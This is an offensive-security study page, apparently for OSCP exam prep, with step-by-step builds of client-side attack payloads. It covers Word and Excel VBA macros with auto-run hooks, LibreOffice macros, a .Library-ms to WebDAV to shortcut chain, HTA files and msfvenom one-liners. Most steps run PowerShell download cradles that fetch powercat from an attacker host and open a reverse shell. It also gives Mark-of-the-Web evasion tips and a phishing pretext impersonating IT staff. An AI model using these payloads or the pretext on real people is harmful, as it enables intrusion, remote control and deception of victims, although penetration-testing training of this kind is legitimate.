Client-Side Attacks

Client-side attacks target software users run — Office, Explorer, browsers. The OSCP-classic buildable payloads: Office VBA macros with AutoOpen / Document_Open / Auto_Open chains, LibreOffice Basic macros bound to Open Document for reviewer-bot targets, Windows `.Library-ms` → WebDAV → LNK chain for Explorer-triggered execution, HTA via mshta.exe, and msfvenom one-liners for every format.

Client-side attacks target the software users run — Office, Explorer, browsers — not the servers they connect to. Every payload here needs a human to open something. Pair with credential-phishing.md for the delivery pretext and initial-access-redteam.md for delivery containers (ISO/IMG/WIM).

Focus of this page: the OSCP-classic buildable payloads:

  1. Office VBA macro (.doc / .docm / .xlsm)
  2. Windows Library file (.Library-ms -> WebDAV -> .lnk)
  3. HTA (.hta via mshta.exe)

Target Recon Before Payload Design

Metadata mining with exiftool

Grab any binary the target publishes (brochures, resumes on LinkedIn, PDFs on their site) and read every tag:

exiftool -a -u brochure.pdf

Flag legend:

  • -a — show all tags including duplicates
  • -u — show unknown tags too

Takeaways:

  • Creator/Producer strings tell you the target's Office version (payload can target that specifically)
  • Author name -> potential employee to impersonate or phish
  • GPS tags on smartphone photos -> facility location

Batch multiple files:

exiftool -r -Author -Producer -Creator -Software /path/to/dump/*.pdf
exiftool image.jpg | grep -Ei 'GPS|Camera|Make|Model'
pdfinfo brochure.pdf

Client fingerprinting via beacon

Get the target to load an attacker URL so their browser leaks headers, geolocation, plugin list.

  • Canarytokens (canarytokens.org) — free web-bug URLs; every click posts back to the dashboard with IP, User-Agent, referrer
  • Your own HTTP server for cleaner control:
python3 -m http.server 80
## every request logs IP, request line, User-Agent, referrer

Or serve a 1x1 pixel with a small PHP/Python script that logs X-Forwarded-For, User-Agent, Accept-Language, Sec-CH-UA.

Office VBA Macros

Understanding Protected View + MOTW

Office 2016+ opens attachments in Protected View — read-only, macros disabled. The victim must:

  1. Click Enable Editing (exits Protected View)
  2. Click Enable Content (enables macros)

Mark-of-the-Web (MOTW) makes this harder for internet-sourced files (see credential-phishing.md#Mark-of-the-Web-MOTW). Workarounds:

  • Ship inside ZIP / ISO / IMG / VHD — MOTW does not propagate to unzipped contents on many Windows versions
  • Use .doc (Office 97-2003 binary) — sometimes bypasses newer macro-blocking policies vs .docm
  • Sign the macro (needs a paid cert or a leaked one)

Building the macro — step by step

Step 1: create an empty .doc (File -> Save As -> Word 97-2003 Document). VBA in .doc triggers on the older AutoOpen() name too, giving dual-hook coverage.

Step 2: open the VBA editor. View ribbon -> Macros -> View Macros -> Create. VBA IDE opens with an empty sub:

Sub MyMacro()
'
' MyMacro Macro
'
'
End Sub

Step 3: prove code execution — pop a PowerShell. Wscript.Shell.Run executes a command as the current user:

Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub

Step 4: chain the auto-run hooks. Word triggers AutoOpen() when a .doc opens; both .doc and .docm trigger Document_Open(). Register both so the payload fires regardless of version quirks:

Sub AutoOpen()
  MyMacro
End Sub
Sub Document_Open()
  MyMacro
End Sub
Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub

Excel equivalent hook is Auto_Open() (underscore, not camelCase):

Sub Auto_Open()
  MyMacro
End Sub

Step 5: swap the payload for a reverse shell one-liner:

powershell.exe -nop -w hidden -enc <BASE64-of-download-cradle>

Where the download cradle (before base64) is:

IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell

Build the base64 on Kali via PowerShell (pwsh). PowerShell -enc expects UTF-16LE bytes, which is what [System.Text.Encoding]::Unicode produces:

pwsh
> $cmd = "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
> $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
> $b64 = [Convert]::ToBase64String($bytes)
> "powershell.exe -nop -w hidden -enc $b64"

Step 6: chunk the base64 string — VBA line-length limit is 1023 chars. Use this Python helper to split into 50-char VBA lines:

#!/usr/bin/env python3
s = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(s), n):
    print('Str = Str + "' + s[i:i+n] + '"')

Paste the printed lines into the macro:

Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ' ...more chunks...
    Str = Str + "A== "
    CreateObject("Wscript.Shell").Run Str
End Sub

Step 7: deliver + catch. On Kali:

python3 -m http.server 80                # serve powercat.ps1 next to your working dir
nc -nvlp 4444                            # catcher

Victim double-clicks report.doc -> Enable Editing -> Enable Content -> AutoOpen() fires -> PowerShell downloads powercat -> reverse shell to Kali.

LibreOffice / OpenOffice Macros (ODT / ODS)

When to use: an app accepts only office documents (.odt/.ods) — often via a "submit your resume / spreadsheet" upload or a mailbox — and a reviewer bot opens the file in LibreOffice (PG Craft — ODT upload; PG Hepet — ODS mailed to mailadmin). A LibreOffice Basic macro bound to the Open Document event runs when the bot opens the file. This is the LibreOffice analogue of an Office VBA macro; Office tricks don't apply.

Manual ODT build (LibreOffice Writer):

' Tools -> Macros -> Organize Macros -> Basic -> Organizer -> Modules ->
'   expand "Untitled 1 -> Standard" -> New -> Module1, then paste:
Sub Main
    Shell("cmd /c powershell -c ""IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8000/shell.ps1')""")
End Sub
  1. Save As → ODF Text Document → shell.odt first (so the doc becomes a selectable event scope).
  2. Tools → Customize → Events → set Save in: shell.odt (NOT LibreOffice, or the macro won't travel with the file) → bind Open Document → Macro… → shell.odt → Standard → Module1 → Main.
  3. The macro must live inside the document, not in "My Macros".

Automated ODS with MMG-LO (keeps shellcode out of the file — fetches a cradle at runtime):

git clone https://github.com/vysecurity/MMG-LO && cd MMG-LO
## Edit build_payload in mmg-ods.py to a powercat/IEX download cradle, then:
python3 mmg-ods.py windows <LHOST> <LPORT>      # -> file.ods
sudo python3 -m http.server 80                  # serve powercat.ps1 / shell.ps1 from here

Deliver to an auto-open mail bot with swaks (PG Hepet — server opens anything mailed to mailadmin):

swaks --to mailadmin@localhost --from you@localhost --server <IP> \
      --header "Subject: Contacts spreadsheet" --body "please print" \
      --attach @file.ods

Windows Library Files (.Library-ms)

A .Library-ms file is XML that tells Explorer "this virtual library is really a remote folder". Point it at your WebDAV share and Explorer auto-mounts the share when the victim double-clicks the file. Anything visible in that folder (like a .lnk) is now one click away from execution.

Anonymous WebDAV on Kali

wsgidav is the simplest Python DAV server.

sudo apt install python3-wsgidav
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/

Flag legend:

  • --host=0.0.0.0 — listen on every interface
  • --port=80 — default HTTP port so Explorer maps it cleanly
  • --auth=anonymous — no credentials required
  • --root <path> — folder to expose

Verify from Kali: http://<LHOST>/ should show the file listing.

The .Library-ms XML

Root element:

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
</libraryDescription>

Display name via string-table resource (avoids the literal "shell32" that some content filters flag):

<name>@windows.storage.dll,-34582</name>
<version>6</version>

Pin to the sidebar + friendly icon (imageres.dll,-1003 = Pictures folder icon, -1002 = Documents):

<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>

Folder type so Explorer treats the contents like Documents:

<templateInfo>
  <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>

Payload half — searchConnectorDescription pointing at your WebDAV:

<searchConnectorDescriptionList>
  <searchConnectorDescription>
    <isDefaultSaveLocation>true</isDefaultSaveLocation>
    <isSupported>false</isSupported>
    <simpleLocation>
      <url>http://<LHOST></url>
    </simpleLocation>
  </searchConnectorDescription>
</searchConnectorDescriptionList>

Complete config.Library-ms (copy-paste ready):

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://<LHOST></url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

Create the .lnk shortcut in the WebDAV share

Right-click Kali/Windows desktop -> New -> Shortcut. Target:

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"

Save as automatic_configuration.lnk, copy into /home/kali/webdav/. Optionally set a benign icon (imageres.dll,-97 = wrench).

Full delivery chain — Kali three-terminal setup

## Terminal 1 — WebDAV serving the .lnk
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/

## Terminal 2 — HTTP server for powercat.ps1
cd /home/kali && python3 -m http.server 8000

## Terminal 3 — reverse shell catcher
nc -nvlp 4444

Email config.Library-ms as an attachment (see credential-phishing.md#Sending-the-Email). Victim opens it -> Explorer maps http://<LHOST>/ -> automatic_configuration.lnk becomes visible -> victim double-clicks it -> UAC "Do you want to run this application?" prompt -> reverse shell.

Pretext body that pairs with the .Library-ms

Hello! My name is Dwight, and I'm a new member of the IT Team.
This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!
If you have any questions, or run into any problems, please let me
know!

SMB drop alternative (writable share instead of email)

cd /home/kali/webdav
rm test.txt                                                # remove the noise file
smbclient //<TARGET>/share -c 'put config.Library-ms'      # -c runs one command then exits
## blank password = null session; or supply -U user%pass

Wait for someone browsing the share to double-click. Catcher fires.

HTA (HTML Applications via mshta.exe)

.hta files run as trusted Windows applications with cscript-level rights. Victim runs mshta http://<LHOST>/payload.hta (or downloads and double-clicks).

payload.hta:

<html>
<head><HTA:APPLICATION APPLICATIONNAME="Config" WINDOWSTATE="minimize"></head>
<body>
<script language="VBScript">
Set shell = CreateObject("wscript.Shell")
shell.Run "powershell.exe -nop -w hidden -enc <b64>", 0, false
self.close
</script>
</body>
</html>

Serve from Kali (python3 -m http.server) and land the victim on it via a phishing link. mshta will fetch and run without a save-file prompt on most default Windows configs.

msfvenom One-Liners for Client-Side Payloads

## HTA (auto-generated form)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hta-psh -o payload.hta

## Word macro (VBA output ready to paste)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f vba -o macro.vba

## EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o beacon.exe

## WScript JS payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f js-le -o pl.js

windows/x64/meterpreter/* is EXAM-RESTRICTED — Meterpreter counts as your one Metasploit target. Prefer windows/x64/shell_reverse_tcp (plain reverse shell) for the other targets and catch it with nc.

Payload Staging over SMB (no HTTP needed)

Bypasses some content filters that alarm on wget/curl:

## Kali — anonymous SMB server hosting the payload
impacket-smbserver share $(pwd) -smb2support

Victim command inside the macro / .lnk:

\\<LHOST>\share\beacon.exe

Flag legend:

  • -smb2support — accept SMB2 clients (Windows 10+ won't fall back to SMB1)
  • first positional (share) — the share name victim sees
  • second positional ($(pwd)) — local path to serve

Extension Trigger Notes
.docm / .doc VBA on open Section above
